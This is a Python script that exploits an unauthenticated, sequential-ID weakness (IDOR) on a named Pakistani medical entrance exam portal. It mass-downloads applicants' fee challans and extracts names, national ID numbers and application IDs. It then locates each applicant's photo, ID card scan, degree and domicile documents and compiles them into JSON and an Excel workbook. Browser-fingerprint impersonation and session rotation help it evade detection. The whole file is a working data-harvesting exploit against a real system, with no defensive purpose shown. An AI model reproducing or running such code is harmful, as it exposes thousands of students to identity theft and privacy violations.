"""
MDCAT 2026 Challan IDOR Scraper
================================
/Payment/DownloadChallan/{id} is publicly accessible — no auth needed.
Each PDF contains: Student Name, ApplicationId, CNIC, Due Date.
IDs are sequential starting from ~2220968283.

Also resolves all document URLs via /Documents/{uni_id}/*.jpg
which reveals which university each student applied to.

Usage:
  python scrape.py --start 2220968000 --end 2221100000
Output:
  applicants_<start>_<end>.json
  applicants_<start>_<end>.xlsx
"""
import argparse, json, re, io, time
from datetime import datetime
import pdfplumber
from curl_cffi import requests as cffi
from openpyxl import Workbook
from openpyxl.styles import Font, PatternFill, Alignment
from openpyxl.utils import get_column_letter
from openpyxl.chart import BarChart, Reference

BASE = 'https://mdcat.pmdc.pk'

UNI_MAP = {
    8: 'UHS (Punjab)',
    2: 'Sindh (DUHS/SMBBMU)',
    3: 'KMU (KPK)',
    1: 'Balochistan',
    4: 'SZABMU (Federal)',
    5: 'AJK',
    6: 'GB',
    7: 'International',
}
UNI_ORDER = [8, 3, 2, 4, 1, 5, 6, 7]   # most populated first

SHORT_NAME = {
    'UHS (Punjab)':        'Punjab - UHS',
    'Sindh (DUHS/SMBBMU)': 'Sindh',
    'KMU (KPK)':           'KPK - KMU',
    'Balochistan':         'Balochistan',
    'SZABMU (Federal)':    'Federal - SZABMU',
    'AJK':                 'AJK',
    'GB':                  'GB',
    'International':       'International',
    'Unknown':             'Unknown',
}

HDR_FILL  = PatternFill('solid', fgColor='1F4E79')
HDR_FONT  = Font(bold=True, color='FFFFFF', size=11)
LINK_FONT = Font(color='0563C1', underline='single', size=11)
ALT_FILL  = PatternFill('solid', fgColor='EEF4FB')


def make_session():
    s = cffi.Session(impersonate='chrome124')
    s.headers['User-Agent'] = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                               'AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36')
    return s


def extract_from_pdf(pdf_bytes):
    try:
        with pdfplumber.open(io.BytesIO(pdf_bytes)) as pdf:
            text = pdf.pages[0].extract_text() or ''
    except Exception:
        return None

    # Two PDF layouts exist:
    # Layout A (single col): "Student Name: ACTUAL NAME (AppId)"
    # Layout B (3-col):      "NAME NAME NAME\nStudent Name:...\n(AppId)(AppId)(AppId)"
    #   pdfplumber reads 3 columns left-to-right, so name lands on the line BEFORE the label
    #   and is repeated 3 times: "MEERAB ZAHID GHAURI MEERAB ZAHID GHAURI MEERAB ZAHID GHAURI"

    student_name = ''
    embedded_id  = None

    # Layout A: name appears after the label on same line
    m_a = re.search(r'Student Name:\s*([^:\n(]+?)\s*\((\d+)\)', text)
    if m_a:
        student_name = m_a.group(1).strip()
        embedded_id  = int(m_a.group(2))
    else:
        # Layout B: name is on the line immediately before "Student Name:"
        lines = text.split('\n')
        for i, line in enumerate(lines):
            if 'Student Name:' in line and i > 0:
                raw = lines[i - 1].strip()
                # De-triple: "A B C A B C A B C" -> "A B C"
                words = raw.split()
                n = len(words)
                deduped = raw
                for size in range(1, n // 2 + 1):
                    if words[size:size * 2] == words[:size]:
                        deduped = ' '.join(words[:size])
                        break
                student_name = deduped
                break

        # AppId for layout B is in parens on the line after label: "(441368)(441368)(441368)"
        paren_m = re.search(r'\((\d{5,7})\)', text)
        if paren_m:
            embedded_id = int(paren_m.group(1))

    cnic_m    = re.search(r'Identity Number:\s*(\d{13})', text)
    challan_m = re.search(r'Challan #:\s*(\d+)', text)
    due_m     = re.search(r'Due Date:\s*([\d-]+)', text)
    exam_m    = re.search(r'Exam Type:\s*(MDCAT-\d+)', text)
    appid_m   = re.search(r'Application(?:\s*(?:Id|ID|No))?[:\s#]+(\d{5,7})', text)

    app_id = embedded_id or (int(appid_m.group(1)) if appid_m else None)

    if not student_name and not cnic_m:
        return None

    return {
        'StudentName':   student_name,
        'ApplicationId': app_id,
        'CNIC':          cnic_m.group(1) if cnic_m else '',
        'ChallanNo':     challan_m.group(1) if challan_m else '',
        'DueDate':       due_m.group(1) if due_m else '',
        'ExamType':      exam_m.group(1).strip() if exam_m else '',
    }


def find_docs(app_id, session):
    """
    Try each university folder via HEAD on the photo.
    On first hit, return all 4 document URLs from the same folder
    without any extra requests.
    """
    if not app_id:
        return '', '', '', '', ''
    for uni_id in UNI_ORDER:
        photo_url = f'{BASE}/Documents/{uni_id}/Picture_{app_id}.jpg'
        try:
            r = session.head(photo_url, timeout=2, verify=False, allow_redirects=True)
            if r.status_code == 200:
                base_doc = f'{BASE}/Documents/{uni_id}'
                return (
                    UNI_MAP[uni_id],
                    photo_url,
                    f'{base_doc}/CNIC_{app_id}.jpg',
                    f'{base_doc}/Degree_{app_id}.jpg',
                    f'{base_doc}/Domicile_{app_id}.jpg',
                )
        except Exception:
            continue
    return '', '', '', '', ''


def _hyperlink(cell, url_or_anchor, label, font=None):
    cell.value = label
    cell.hyperlink = url_or_anchor
    cell.font = font or LINK_FONT
    cell.alignment = Alignment(horizontal='center')


def _sheet_anchor(sheet_name):
    """Return a valid Excel internal anchor for a sheet name (quotes sheet names with spaces)."""
    if any(c in sheet_name for c in (' ', '-', '(', ')')):
        return f"#'{sheet_name}'!A1"
    return f'#{sheet_name}!A1'


def save_xlsx(applicants, path):
    wb = Workbook()

    # Group by university, sorted by count descending
    groups = {}
    for a in applicants:
        u = a.get('University') or 'Unknown'
        groups.setdefault(u, []).append(a)
    uni_order = sorted(groups.keys(), key=lambda u: -len(groups[u]))

    # ── Sheet 1: Stats ───────────────────────────────────────────────────────
    ws = wb.active
    ws.title = 'Stats'
    ws.sheet_view.showGridLines = False

    ws.column_dimensions['A'].width = 30
    ws.column_dimensions['B'].width = 14
    ws.column_dimensions['C'].width = 12
    ws.column_dimensions['D'].width = 22

    # Title block
    ws.row_dimensions[1].height = 36
    ws.row_dimensions[2].height = 16
    ws.row_dimensions[3].height = 26
    ws.row_dimensions[4].height = 10

    c = ws.cell(row=1, column=1, value='MDCAT 2026 — Applicant Stats')
    c.font = Font(bold=True, size=18, color='1F4E79')
    c.alignment = Alignment(vertical='center')
    ws.merge_cells('A1:D1')

    scraped = applicants[0].get('_scraped_at', '')[:10] if applicants else ''
    c2 = ws.cell(row=2, column=1, value=f'Data scraped: {scraped}')
    c2.font = Font(italic=True, color='888888', size=10)
    ws.merge_cells('A2:D2')

    c3 = ws.cell(row=3, column=1, value=f'Total Applicants:  {len(applicants):,}')
    c3.font = Font(bold=True, size=14, color='2E75B6')
    ws.merge_cells('A3:D3')

    # Table header row 5
    ws.row_dimensions[5].height = 22
    for col, h in enumerate(['University / Conducting Body', 'Students', 'Share %', 'Open Sheet'], 1):
        c = ws.cell(row=5, column=col, value=h)
        c.fill = HDR_FILL
        c.font = HDR_FONT
        c.alignment = Alignment(horizontal='center', vertical='center')

    total = len(applicants)
    for i, uni in enumerate(uni_order):
        row_i = i + 6
        ws.row_dimensions[row_i].height = 18
        count = len(groups[uni])
        pct = round(count / total * 100, 1) if total else 0
        sname = SHORT_NAME.get(uni, uni[:31])

        if i % 2 == 1:
            for col in range(1, 5):
                ws.cell(row=row_i, column=col).fill = ALT_FILL

        c1 = ws.cell(row=row_i, column=1, value=uni)
        c1.alignment = Alignment(vertical='center')

        c2 = ws.cell(row=row_i, column=2, value=count)
        c2.alignment = Alignment(horizontal='center', vertical='center')

        c3 = ws.cell(row=row_i, column=3, value=f'{pct}%')
        c3.alignment = Alignment(horizontal='center', vertical='center')

        _hyperlink(ws.cell(row=row_i, column=4), _sheet_anchor(sname), sname)

    # Bar chart
    last_row = 5 + len(uni_order)
    chart = BarChart()
    chart.type = 'bar'
    chart.title = 'Students per University'
    chart.legend = None
    chart.width = 20
    chart.height = 12
    chart.add_data(Reference(ws, min_col=2, min_row=5, max_row=last_row), titles_from_data=True)
    chart.set_categories(Reference(ws, min_col=1, min_row=6, max_row=last_row))
    ws.add_chart(chart, f'A{last_row + 2}')

    # ── Province sheets ──────────────────────────────────────────────────────
    DOC_COLS   = ['#', 'Application ID', 'Student Name', 'CNIC',
                  'Photo', 'CNIC Doc', 'Degree/FSc', 'Domicile', 'Due Date']
    DOC_WIDTHS = [5, 16, 32, 16, 11, 11, 13, 11, 12]

    for uni in uni_order:
        sname = SHORT_NAME.get(uni, uni[:31])
        ws2 = wb.create_sheet(title=sname)
        ws2.sheet_view.showGridLines = False

        # Back link
        ws2.row_dimensions[1].height = 18
        _hyperlink(ws2.cell(row=1, column=1), _sheet_anchor('Stats'), '<< Back to Stats')
        ws2.merge_cells(f'A1:{get_column_letter(len(DOC_COLS))}1')

        # Province heading
        ws2.row_dimensions[2].height = 24
        t = ws2.cell(row=2, column=1, value=f'{uni}  —  {len(groups[uni]):,} students')
        t.font = Font(bold=True, size=13, color='1F4E79')
        t.alignment = Alignment(vertical='center')
        ws2.merge_cells(f'A2:{get_column_letter(len(DOC_COLS))}2')

        # Empty spacer row 3
        ws2.row_dimensions[3].height = 6

        # Column headers row 4
        ws2.row_dimensions[4].height = 22
        for col, h in enumerate(DOC_COLS, 1):
            c = ws2.cell(row=4, column=col, value=h)
            c.fill = HDR_FILL
            c.font = HDR_FONT
            c.alignment = Alignment(horizontal='center', vertical='center')

        for i, a in enumerate(groups[uni], 1):
            r = i + 4
            ws2.row_dimensions[r].height = 16

            if i % 2 == 1:
                for col in range(1, len(DOC_COLS) + 1):
                    ws2.cell(row=r, column=col).fill = ALT_FILL

            ws2.cell(row=r, column=1, value=i).alignment = Alignment(horizontal='center')
            ws2.cell(row=r, column=2, value=a.get('ApplicationId') or '').alignment = Alignment(horizontal='center')
            ws2.cell(row=r, column=3, value=a.get('StudentName', ''))

            cn = ws2.cell(row=r, column=4, value=str(a.get('CNIC', '')))
            cn.number_format = '@'

            for col, key in [(5, 'PhotoURL'), (6, 'CNICURL'), (7, 'DegreeURL'), (8, 'DomicileURL')]:
                url = a.get(key, '')
                labels = {5: 'Photo', 6: 'CNIC', 7: 'Degree', 8: 'Domicile'}
                if url:
                    _hyperlink(ws2.cell(row=r, column=col), url, labels[col])
                else:
                    ws2.cell(row=r, column=col, value='')

            ws2.cell(row=r, column=9, value=a.get('DueDate', '')).alignment = Alignment(horizontal='center')

        for col, width in enumerate(DOC_WIDTHS, 1):
            ws2.column_dimensions[get_column_letter(col)].width = width
        ws2.freeze_panes = 'A5'

    wb.save(path)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--start',     type=int,   required=True)
    ap.add_argument('--end',       type=int,   required=True)
    ap.add_argument('--delay',     type=float, default=0.05)
    ap.add_argument('--no-photos', action='store_true', help='Skip document lookup')
    args = ap.parse_args()

    out_json = f'applicants_{args.start}_{args.end}.json'
    out_xlsx = f'applicants_{args.start}_{args.end}.xlsx'

    print(f'Scraping challan IDs {args.start:,} to {args.end:,}')
    s = make_session()
    applicants = []
    found = 0
    miss_streak = 0

    for challan_id in range(args.start, args.end + 1):

        if (challan_id - args.start) % 1000 == 0 and challan_id != args.start:
            s = make_session()
            pct = (challan_id - args.start) / max(1, args.end - args.start) * 100
            print(f'  {challan_id:,} ({pct:.1f}%) | Found: {found}')

        try:
            r = s.get(f'{BASE}/Payment/DownloadChallan/{challan_id}',
                      timeout=15, verify=False, allow_redirects=True)
        except Exception:
            time.sleep(1)
            continue

        if r.status_code != 200 or len(r.content) < 30000:
            miss_streak += 1
            if miss_streak > 10000:
                print(f'  10,000 consecutive misses at {challan_id:,} — stopping')
                break
            continue  # no sleep on misses — most of the range is empty

        miss_streak = 0
        data = extract_from_pdf(r.content)
        if data:
            # Skip non-MDCAT-2026 challans (other exams share the same ID space)
            if data.get('ExamType') != 'MDCAT-2026':
                continue
            data['ChallanId']   = challan_id
            data['_scraped_at'] = datetime.utcnow().isoformat()

            if not args.no_photos and data.get('ApplicationId'):
                uni, photo, cnic_doc, degree, domicile = find_docs(data['ApplicationId'], s)
                data['University']  = uni
                data['PhotoURL']    = photo
                data['CNICURL']     = cnic_doc
                data['DegreeURL']   = degree
                data['DomicileURL'] = domicile
            else:
                data['University']  = ''
                data['PhotoURL']    = ''
                data['CNICURL']     = ''
                data['DegreeURL']   = ''
                data['DomicileURL'] = ''

            applicants.append(data)
            found += 1
            if found % 100 == 0:
                print(f'  Found {found} | {data["StudentName"]} | {data.get("University") or "uni unknown"}')

        time.sleep(args.delay)

    print(f'\nDone: {found} students found in challan range {args.start:,}-{args.end:,}')

    if applicants:
        uni_counts = {}
        for a in applicants:
            u = a.get('University') or 'Unknown'
            uni_counts[u] = uni_counts.get(u, 0) + 1
        print('\nUniversity breakdown:')
        for u, c in sorted(uni_counts.items(), key=lambda x: -x[1]):
            print(f'  {u}: {c}')

    with open(out_json, 'w', encoding='utf-8') as f:
        json.dump({'applicants': applicants, 'total': found,
                   'range': [args.start, args.end]}, f, ensure_ascii=False, indent=2)
    print(f'JSON saved: {out_json}')

    if applicants:
        save_xlsx(applicants, out_xlsx)
        print(f'Excel saved: {out_xlsx}')

if __name__ == '__main__':
    main()
